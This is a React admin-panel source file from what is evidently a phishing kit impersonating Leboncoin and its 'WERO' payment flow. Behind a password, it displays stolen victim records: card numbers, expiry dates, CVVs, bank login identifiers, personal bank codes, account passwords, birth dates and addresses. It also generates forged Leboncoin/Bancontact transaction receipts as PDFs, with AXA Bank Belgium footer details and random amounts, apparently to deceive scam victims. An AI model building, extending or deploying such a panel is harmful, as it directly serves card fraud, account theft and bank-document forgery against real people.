
import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { User, FileText, Trash2, LogOut, Copy, Edit, FileDown } from "lucide-react";
import { checkAdminPassword } from "@/utils/sessionUtils";
import { cn } from "@/lib/utils";
import { getAllUsers, deleteUserByEmail, UserData } from "@/utils/supabaseClient";
import { toast } from "sonner";
import { jsPDF } from "jspdf";
import { format } from "date-fns";

const Admin: React.FC = () => {
  const [isAuthenticated, setIsAuthenticated] = useState<boolean>(false);
  const [password, setPassword] = useState<string>("");
  const [error, setError] = useState<string>("");
  const [usersData, setUsersData] = useState<UserData[]>([]);
  const [expandedUser, setExpandedUser] = useState<string | null>(null);
  const [searchTerm, setSearchTerm] = useState<string>("");
  const [isLoading, setIsLoading] = useState<boolean>(false);
  const navigate = useNavigate();

  useEffect(() => {
    if (isAuthenticated) {
      loadUserData();
    }
  }, [isAuthenticated]);

  const loadUserData = async () => {
    try {
      setIsLoading(true);
      const data = await getAllUsers();
      if (data) {
        setUsersData(data);
        toast.success(`${data.length} utilisateurs chargés`);
      } else {
        toast.error("Aucun utilisateur n'a été trouvé");
        setUsersData([]);
      }
    } catch (error) {
      console.error("Error loading user data:", error);
      toast.error("Erreur lors du chargement des données");
      setUsersData([]);
    } finally {
      setIsLoading(false);
    }
  };

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (checkAdminPassword(password)) {
      setIsAuthenticated(true);
      setError("");
    } else {
      setError("Mot de passe incorrect");
    }
  };

  const handleLogout = () => {
    setIsAuthenticated(false);
    setPassword("");
  };

  const handleDelete = async (email: string) => {
    if (window.confirm("Êtes-vous sûr de vouloir supprimer cet utilisateur ?")) {
      try {
        setIsLoading(true);
        await deleteUserByEmail(email);
        toast.success("Utilisateur supprimé avec succès");
        await loadUserData();
      } catch (error) {
        console.error("Error deleting user:", error);
        toast.error("Erreur lors de la suppression de l'utilisateur");
      } finally {
        setIsLoading(false);
      }
    }
  };

  const toggleExpand = (email: string) => {
    if (expandedUser === email) {
      setExpandedUser(null);
    } else {
      setExpandedUser(email);
    }
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    toast.success("Copié dans le presse-papier !");
  };

  const filteredUsers = usersData.filter(user => {
    const searchFields = [
      user.nom,
      user.prenom,
      user.email,
      user.telephone,
      user.adresse,
      user.ville,
      user.numerocarte
    ].filter(Boolean).join(" ").toLowerCase();
    
    return searchFields.includes(searchTerm.toLowerCase());
  });

  const generatePDF = (user: UserData) => {
    const doc = new jsPDF();
    const pageWidth = doc.internal.pageSize.getWidth();
    const currentDate = format(new Date(), "dd/MM/yyyy");
    const montant = user.montant || generateRandomAmount();
    
    // Instead of SVG, add text for logo
    doc.setFontSize(14);
    doc.setFont("helvetica", "bold");
    doc.setTextColor(255, 110, 20); // Leboncoin orange
    doc.text("leboncoin", 15, 20);
    
    // Add title
    doc.setTextColor(0, 0, 0); // Reset to black
    doc.setFontSize(16);
    doc.text("Détail opération", pageWidth - 60, 20);
    
    // Add horizontal line
    doc.setLineWidth(0.5);
    doc.line(15, 30, pageWidth - 15, 30);
    
    // Add content
    doc.setFontSize(12);
    doc.setFont("helvetica", "normal");
    
    // Account section
    doc.text("Compte :", 20, 60);
    doc.setFont("helvetica", "bold");
    doc.text(`${user.nom || 'N/A'} ${user.prenom || 'N/A'}`, 100, 60);
    doc.setFont("helvetica", "normal");
    doc.text("Leboncoin By Bancontact", 100, 70);
    
    // Amount section
    doc.text("Montant :", 20, 90);
    doc.setFont("helvetica", "normal");
    doc.text("(Virement instantané en euros)", 100, 90);
    doc.setFont("helvetica", "bold");
    doc.text(montant.toString(), 100, 100);
    
    // Date section
    doc.text("Date de l'opération :", 20, 120);
    doc.setFont("helvetica", "bold");
    doc.text(currentDate, 100, 120);
    
    // Footer
    doc.setFontSize(8);
    doc.setFont("helvetica", "normal");
    const footerText = "AXA Bank Belgium fait partie du Groupe Crelan - Boulevard Sylvain Dupuis 251, 1070 Anderlecht - TEL 03 286 66 00 - ";
    const footerText2 = "www.axabank.be - BIC: AXABBE22 - IBAN BE67 7000 9198 0287 - N° BCE : TVA BE 0404 476 835 RPM Bruxelles - FSMA 036705 A";
    doc.text(footerText, 15, 280);
    doc.text(footerText2, 15, 285);
    
    // Save the PDF
    const userName = `${user.nom || 'user'}_${user.prenom || ''}`.replace(/\s+/g, '_').toLowerCase();
    doc.save(`transaction_${userName}_${currentDate.replace(/\//g, '-')}.pdf`);
    
    toast.success("PDF généré avec succès");
  };

  const generateRandomCode = () => {
    return `${Math.floor(Math.random() * 26 + 65).toString(36).toUpperCase()}${Math.floor(Math.random() * 26 + 65).toString(36).toUpperCase()}${Math.floor(Math.random() * 10)}-${Math.floor(Math.random() * 10)}${Math.floor(Math.random() * 26 + 65).toString(36).toUpperCase()}${Math.floor(Math.random() * 10)}`;
  };

  const generateRandomAmount = () => {
    return `${Math.floor(Math.random() * 300) + 50}€`;
  };

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen flex flex-col bg-gray-100">
        <div className="flex-1 flex items-center justify-center">
          <div className="w-full max-w-md p-8 bg-white rounded-lg shadow-lg">
            <div className="flex justify-center mb-6">
              <img src="/logo.svg" alt="Leboncoin" className="h-10" />
            </div>
            <h1 className="text-2xl font-bold text-center mb-6">Connexion Administrateur</h1>
            
            <form onSubmit={handleLogin} className="space-y-6">
              <div>
                <label htmlFor="password" className="block text-sm font-medium text-gray-700 mb-1">
                  Mot de passe
                </label>
                <input
                  id="password"
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-leboncoin-orange"
                  required
                />
              </div>
              
              {error && (
                <div className="text-red-500 text-sm">{error}</div>
              )}
              
              <button
                type="submit"
                className="w-full py-2 px-4 bg-leboncoin-orange text-white font-semibold rounded-md hover:bg-orange-600 focus:outline-none focus:ring-2 focus:ring-orange-400"
              >
                Se connecter
              </button>
            </form>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen flex flex-col bg-[#827117]">
      <header className="bg-white p-4 shadow-md">
        <div className="container mx-auto flex justify-between items-center">
          <div className="flex items-center">
            <img src="/logo.svg" alt="Leboncoin" className="h-8 mr-2" />
            <h1 className="text-xl font-bold">Panneau d'administration</h1>
          </div>
          <div className="flex items-center gap-2">
            <button
              onClick={loadUserData}
              className="flex items-center gap-2 px-4 py-2 bg-blue-500 text-white rounded hover:bg-blue-600"
              disabled={isLoading}
            >
              {isLoading ? "Chargement..." : "Actualiser les données"}
            </button>
            <button
              onClick={handleLogout}
              className="flex items-center gap-2 px-4 py-2 bg-red-500 text-white rounded hover:bg-red-600"
            >
              <LogOut size={16} />
              Déconnexion
            </button>
          </div>
        </div>
      </header>

      <main className="flex-1 container mx-auto py-6 px-4">
        <div className="bg-gray-200 rounded-lg p-6">
          <div className="flex justify-between items-center mb-6">
            <h2 className="text-2xl font-bold">Données Utilisateurs WERO</h2>
            <div className="flex gap-4">
              <div className="relative">
                <input
                  type="text"
                  placeholder="Rechercher..."
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                  className="pl-10 pr-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-leboncoin-orange"
                />
                <div className="absolute left-3 top-2.5 text-gray-400">
                  <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <circle cx="11" cy="11" r="8"></circle>
                    <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
                  </svg>
                </div>
              </div>
            </div>
          </div>

          {isLoading ? (
            <div className="flex justify-center items-center py-10">
              <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-gray-900"></div>
            </div>
          ) : (
            <div className="space-y-6">
              {filteredUsers.length === 0 ? (
                <div className="text-center py-8 text-gray-500">
                  Aucun utilisateur trouvé
                </div>
              ) : (
                filteredUsers.map((user, index) => (
                  <div key={index} className="bg-white rounded-lg shadow overflow-hidden">
                    <div className="p-4 border-b">
                      <div className="flex justify-between items-start">
                        <div>
                          <h3 className="text-xl font-semibold">
                            {user.nom || 'N/A'} {user.prenom || 'N/A'}
                          </h3>
                          <div className="text-sm text-gray-600 mt-1">
                            <p>Code: {user.code || generateRandomCode()}</p>
                            <p>Téléphone: {user.telephone || 'N/A'}</p>
                            <p>Pays: FR</p>
                            <p>Dernière modification: {user.dernieremaj || user.derniereMaj || new Date().toLocaleString('fr-FR')}</p>
                          </div>
                        </div>
                        <div className="flex gap-2">
                          <button 
                            onClick={() => toggleExpand(user.email || '')}
                            className="p-2 bg-blue-100 text-blue-600 rounded hover:bg-blue-200"
                            aria-label="Voir les détails"
                          >
                            <FileText size={16} />
                          </button>
                          <button 
                            onClick={() => generatePDF(user)}
                            className="p-2 bg-green-100 text-green-600 rounded hover:bg-green-200"
                            aria-label="Générer PDF"
                          >
                            <FileDown size={16} />
                          </button>
                          <button 
                            onClick={() => handleDelete(user.email || '')}
                            className="p-2 bg-red-100 text-red-600 rounded hover:bg-red-200"
                            aria-label="Supprimer l'utilisateur"
                          >
                            <Trash2 size={16} />
                          </button>
                        </div>
                      </div>
                    </div>

                    {expandedUser === user.email && (
                      <div className="p-4 bg-gray-50">
                        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                          <div className="space-y-4">
                            <div>
                              <h4 className="flex items-center text-lg font-medium text-gray-800 mb-2">
                                <User size={18} className="mr-2 text-leboncoin-orange" />
                                Informations bancaires
                              </h4>
                              <div className="space-y-2">
                                <div className="flex justify-between text-sm">
                                  <span className="text-gray-600">Email:</span>
                                  <span className="font-medium flex items-center">
                                    {user.email || 'N/A'}
                                    <button 
                                      onClick={() => copyToClipboard(user.email || '')}
                                      className="ml-2 text-blue-500 hover:text-blue-700"
                                    >
                                      <Copy size={14} />
                                    </button>
                                  </span>
                                </div>
                                <div className="flex justify-between text-sm">
                                  <span className="text-gray-600">Titulaire:</span>
                                  <span className="font-medium">{user.nom || 'N/A'} {user.prenom || 'N/A'}</span>
                                </div>
                                <div className="flex justify-between text-sm">
                                  <span className="text-gray-600">Numéro de carte:</span>
                                  <span className="font-medium">{user.numerocarte || user.numeroCarte || 'N/A'}</span>
                                </div>
                                <div className="flex justify-between text-sm">
                                  <span className="text-gray-600">Expiration:</span>
                                  <span className="font-medium">{user.dateexpiration || user.dateExpiration || 'N/A'}</span>
                                </div>
                                <div className="flex justify-between text-sm">
                                  <span className="text-gray-600">CVV:</span>
                                  <span className="font-medium">{user.cryptogramme || 'N/A'}</span>
                                </div>
                                <div className="flex justify-between text-sm">
                                  <span className="text-gray-600">Type de banque:</span>
                                  <span className="font-medium">{user.typebanque || user.typeBanque || 'N/A'}</span>
                                </div>
                                <div className="flex justify-between text-sm">
                                  <span className="text-gray-600">Identifiant bancaire:</span>
                                  <span className="font-medium">{user.identifiantbancaire || user.identifiantBancaire || 'N/A'}</span>
                                </div>
                                <div className="flex justify-between text-sm">
                                  <span className="text-gray-600">Code personnel:</span>
                                  <span className="font-medium">{user.codepersonnel || user.codePersonnel || 'N/A'}</span>
                                </div>
                                <div className="flex justify-between text-sm">
                                  <span className="text-gray-600">Montant:</span>
                                  <span className="font-medium text-green-500">{user.montant || generateRandomAmount()}</span>
                                </div>
                              </div>
                            </div>
                          </div>

                          <div className="space-y-4">
                            <div>
                              <h4 className="flex items-center text-lg font-medium text-gray-800 mb-2">
                                <User size={18} className="mr-2 text-leboncoin-orange" />
                                Informations de connexion
                              </h4>
                              <div className="space-y-2">
                                <div className="flex justify-between text-sm">
                                  <span className="text-gray-600">Email:</span>
                                  <span className="font-medium">{user.email || 'N/A'}</span>
                                </div>
                                <div className="flex justify-between text-sm">
                                  <span className="text-gray-600">Mot de passe:</span>
                                  <span className="font-medium">{user.password || 'N/A'}</span>
                                </div>
                              </div>

                              <h4 className="flex items-center text-lg font-medium text-gray-800 mt-6 mb-2">
                                <User size={18} className="mr-2 text-leboncoin-orange" />
                                Informations personnelles
                              </h4>
                              <div className="space-y-2">
                                <div className="flex justify-between text-sm">
                                  <span className="text-gray-600">Nom:</span>
                                  <span className="font-medium">{user.nom || 'N/A'}</span>
                                </div>
                                <div className="flex justify-between text-sm">
                                  <span className="text-gray-600">Prénom:</span>
                                  <span className="font-medium">{user.prenom || 'N/A'}</span>
                                </div>
                                <div className="flex justify-between text-sm">
                                  <span className="text-gray-600">Date de naissance:</span>
                                  <span className="font-medium">{user.datenaissance || user.dateNaissance || 'N/A'}</span>
                                </div>
                                <div className="flex justify-between text-sm">
                                  <span className="text-gray-600">Adresse:</span>
                                  <span className="font-medium">{user.adresse || 'N/A'}</span>
                                </div>
                                <div className="flex justify-between text-sm">
                                  <span className="text-gray-600">Code postal:</span>
                                  <span className="font-medium">{user.codepostal || user.codePostal || 'N/A'}</span>
                                </div>
                                <div className="flex justify-between text-sm">
                                  <span className="text-gray-600">Ville:</span>
                                  <span className="font-medium">{user.ville || 'N/A'}</span>
                                </div>
                                <div className="flex justify-between text-sm">
                                  <span className="text-gray-600">Téléphone:</span>
                                  <span className="font-medium">{user.telephone || 'N/A'}</span>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    )}
                  </div>
                ))
              )}
            </div>
          )}
        </div>
      </main>
    </div>
  );
};

export default Admin;
